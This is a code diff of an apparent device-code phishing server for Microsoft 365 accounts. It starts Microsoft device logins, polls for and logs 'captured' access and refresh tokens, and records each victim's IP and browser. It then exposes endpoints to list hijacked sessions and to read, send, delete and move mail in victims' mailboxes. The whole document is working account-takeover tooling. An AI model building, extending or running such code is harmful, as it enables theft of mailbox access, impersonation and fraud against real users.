@@ -11,9 +11,9 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-// Working configuration for ANY Microsoft 365 account (Business, Education, GoDaddy)
+// Microsoft Device Code Configuration
 const MICROSOFT_CONFIG = {
-    clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Microsoft 365 Demo Client
+    clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
     deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
     tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
     scopes: 'https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite https://graph.microsoft.com/User.Read offline_access'
@@ -23,17 +23,14 @@ let userSessions = new Map();
 let pendingDeviceCodes = new Map();
 
 function getClientIp(req) {
-    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 }
 
-function getUserAgent(req) {
-    return req.headers['user-agent'] || 'Unknown';
-}
-
+// Start device authentication
 app.post('/api/device/auth/start', async (req, res) => {
     try {
         const clientIp = getClientIp(req);
-        const userAgent = getUserAgent(req);
+        const userAgent = req.headers['user-agent'] || 'Unknown';
         
         const response = await axios.post(MICROSOFT_CONFIG.deviceCodeUrl,
             new URLSearchParams({
@@ -48,27 +45,18 @@ app.post('/api/device/auth/start', async (req, res) => {
         const sessionId = crypto.randomBytes(32).toString('hex');
         
         pendingDeviceCodes.set(device_code, {
-            device_code,
-            user_code,
-            sessionId,
-            status: 'pending',
-            ip: clientIp,
-            userAgent: userAgent,
+            device_code, user_code, sessionId, status: 'pending',
+            ip: clientIp, userAgent: userAgent,
             createdAt: Date.now(),
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
         startPollingForToken(device_code, sessionId);
         
-        res.json({
-            sessionId,
-            user_code,
-            verification_uri,
-            expires_in
-        });
+        res.json({ sessionId, user_code, verification_uri, expires_in });
         
     } catch (err) {
-        console.error('Device code error:', err.response?.data || err.message);
+        console.error('Device code error:', err.message);
         res.status(500).json({ error: 'Failed to start device authentication' });
     }
 });
@@ -101,20 +89,9 @@ async function startPollingForToken(device_code, sessionId) {
             
             const tokens = response.data;
             
-            // Get full user info including photo
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
-            
-            // Try to get user photo
-            let userPhoto = null;
-            try {
-                const photoResponse = await axios.get('https://graph.microsoft.com/v1.0/me/photo/$value', {
-                    headers: { 'Authorization': `Bearer ${tokens.access_token}` },
-                    responseType: 'arraybuffer'
-                });
-                userPhoto = Buffer.from(photoResponse.data, 'binary').toString('base64');
-            } catch (err) {}
             
             const session = {
                 sessionId,
@@ -123,7 +100,6 @@ async function startPollingForToken(device_code, sessionId) {
                 userId: userInfo.data.id,
                 ip: pendingDevice.ip,
                 userAgent: pendingDevice.userAgent,
-                userPhoto: userPhoto,
                 tokens: {
                     access_token: tokens.access_token,
                     refresh_token: tokens.refresh_token,
@@ -135,47 +111,43 @@ async function startPollingForToken(device_code, sessionId) {
             };
             
             userSessions.set(sessionId, session);
-            console.log(`✅ Token captured for ${session.email} (${session.ip})`);
-            clearInterval(pollInterval);
+            pendingDevice.status = 'approved';
             pendingDeviceCodes.delete(device_code);
+            clearInterval(pollInterval);
+            
+            console.log(`✅ Token captured for ${session.email}`);
             
         } catch (err) {
             if (err.response?.data?.error !== 'authorization_pending') {
-                console.log('Polling...');
+                console.log('Waiting for user approval...');
             }
         }
     }, 3000);
 }
 
-// Helper to refresh token
-async function refreshToken(session) {
-    try {
-        const response = await axios.post(MICROSOFT_CONFIG.tokenUrl,
-            new URLSearchParams({
-                grant_type: 'refresh_token',
-                refresh_token: session.tokens.refresh_token,
-                client_id: MICROSOFT_CONFIG.clientId
-            }), {
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-            }
-        );
-        
-        session.tokens.access_token = response.data.access_token;
-        session.tokens.refresh_token = response.data.refresh_token || session.tokens.refresh_token;
-        session.tokens.expires_in = response.data.expires_in;
-        session.tokens.expires_at = Date.now() + (response.data.expires_in * 1000);
-        session.lastActive = new Date().toISOString();
-        
-        return session.tokens.access_token;
-    } catch (err) {
-        console.error('Token refresh failed:', err.message);
-        return null;
-    }
-}
-
 async function getValidToken(session) {
     if (Date.now() >= session.tokens.expires_at - 300000) {
-        return await refreshToken(session);
+        try {
+            const response = await axios.post(MICROSOFT_CONFIG.tokenUrl,
+                new URLSearchParams({
+                    grant_type: 'refresh_token',
+                    refresh_token: session.tokens.refresh_token,
+                    client_id: MICROSOFT_CONFIG.clientId
+                }), {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }
+            );
+            
+            session.tokens.access_token = response.data.access_token;
+            session.tokens.refresh_token = response.data.refresh_token || session.tokens.refresh_token;
+            session.tokens.expires_in = response.data.expires_in;
+            session.tokens.expires_at = Date.now() + (response.data.expires_in * 1000);
+            session.lastActive = new Date().toISOString();
+            
+            return session.tokens.access_token;
+        } catch (err) {
+            return null;
+        }
     }
     return session.tokens.access_token;
 }
@@ -206,16 +178,37 @@ app.get('/api/sessions', async (req, res) => {
         ip: s.ip,
         userAgent: s.userAgent,
         lastActive: s.lastActive,
-        createdAt: s.createdAt,
-        userPhoto: s.userPhoto
+        createdAt: s.createdAt
     }));
     res.json({ sessions });
 });
 
-// Get all emails
-app.get('/api/mail/:sessionId', async (req, res) => {
+// Get all mail folders
+app.get('/api/mail/folders/:sessionId', async (req, res) => {
     const { sessionId } = req.params;
-    const { folder = 'inbox', top = 50 } = req.query;
+    const session = userSessions.get(sessionId);
+    
+    if (!session) return res.status(401).json({ error: 'Session not found' });
+    
+    const token = await getValidToken(session);
+    if (!token) return res.status(401).json({ error: 'Token expired' });
+    
+    try {
+        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
+            headers: { 'Authorization': `Bearer ${token}` },
+            params: { '$top': 100 }
+        });
+        
+        res.json(response.data);
+    } catch (err) {
+        res.status(500).json({ error: 'Failed to fetch folders' });
+    }
+});
+
+// Get emails from specific folder
+app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
+    const { sessionId, folderId } = req.params;
+    const { top = 50 } = req.query;
     
     const session = userSessions.get(sessionId);
     if (!session) return res.status(401).json({ error: 'Session not found' });
@@ -224,29 +217,35 @@ app.get('/api/mail/:sessionId', async (req, res) => {
     if (!token) return res.status(401).json({ error: 'Token expired' });
     
     try {
-        let folderPath = 'inbox';
-        if (folder === 'sent') folderPath = 'sentitems';
-        else if (folder === 'drafts') folderPath = 'drafts';
-        else if (folder === 'deleted') folderPath = 'deleteditems';
+        let folderPath = folderId;
+        const folderMap = {
+            'inbox': 'inbox',
+            'sent': 'sentitems',
+            'drafts': 'drafts',
+            'deleted': 'deleteditems',
+            'archive': 'archive',
+            'junk': 'junkemail'
+        };
+        
+        folderPath = folderMap[folderId] || folderId;
         
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderPath}/messages`, {
             headers: { 'Authorization': `Bearer ${token}` },
             params: {
                 '$top': top,
                 '$orderby': 'receivedDateTime desc',
-                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance'
+                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance,conversationId'
             }
         });
         
         res.json(response.data);
     } catch (err) {
-        console.error('Get mail error:', err.response?.data);
         res.status(500).json({ error: 'Failed to fetch emails' });
     }
 });
 
 // Get single email with full body
-app.get('/api/mail/:sessionId/message/:messageId', async (req, res) => {
+app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
     const { sessionId, messageId } = req.params;
     
     const session = userSessions.get(sessionId);
@@ -268,9 +267,9 @@ app.get('/api/mail/:sessionId/message/:messageId', async (req, res) => {
 });
 
 // Send email
-app.post('/api/mail/:sessionId/send', async (req, res) => {
+app.post('/api/mail/send/:sessionId', async (req, res) => {
     const { sessionId } = req.params;
-    const { to, subject, body, cc, bcc } = req.body;
+    const { to, subject, body, cc } = req.body;
     
     const session = userSessions.get(sessionId);
     if (!session) return res.status(401).json({ error: 'Session not found' });
@@ -296,15 +295,14 @@ app.post('/api/mail/:sessionId/send', async (req, res) => {
             headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
         });
         
-        res.json({ success: true, message: 'Email sent successfully' });
+        res.json({ success: true });
     } catch (err) {
-        console.error('Send email error:', err.response?.data);
         res.status(500).json({ error: 'Failed to send email' });
     }
 });
 
 // Delete email
-app.delete('/api/mail/:sessionId/message/:messageId', async (req, res) => {
+app.delete('/api/mail/message/:sessionId/:messageId', async (req, res) => {
     const { sessionId, messageId } = req.params;
     
     const session = userSessions.get(sessionId);
@@ -325,7 +323,7 @@ app.delete('/api/mail/:sessionId/message/:messageId', async (req, res) => {
 });
 
 // Mark as read/unread
-app.patch('/api/mail/:sessionId/message/:messageId', async (req, res) => {
+app.patch('/api/mail/message/:sessionId/:messageId', async (req, res) => {
     const { sessionId, messageId } = req.params;
     const { isRead } = req.body;
     
@@ -347,10 +345,10 @@ app.patch('/api/mail/:sessionId/message/:messageId', async (req, res) => {
     }
 });
 
-// Create folder rule
-app.post('/api/mail/:sessionId/folder', async (req, res) => {
-    const { sessionId } = req.params;
-    const { displayName } = req.body;
+// Move email to folder
+app.post('/api/mail/move/:sessionId/:messageId', async (req, res) => {
+    const { sessionId, messageId } = req.params;
+    const { destinationId } = req.body;
     
     const session = userSessions.get(sessionId);
     if (!session) return res.status(401).json({ error: 'Session not found' });
@@ -359,14 +357,14 @@ app.post('/api/mail/:sessionId/folder', async (req, res) => {
     if (!token) return res.status(401).json({ error: 'Token expired' });
     
     try {
-        const response = await axios.post('https://graph.microsoft.com/v1.0/me/mailFolders',
-            { displayName: displayName },
+        const response = await axios.post(`https://graph.microsoft.com/v1.0/me/messages/${messageId}/move`,
+            { destinationId: destinationId },
             { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
         );
         
-        res.json({ success: true, folder: response.data });
+        res.json({ success: true });
     } catch (err) {
-        res.status(500).json({ error: 'Failed to create folder' });
+        res.status(500).json({ error: 'Failed to move message' });
     }
 });
 
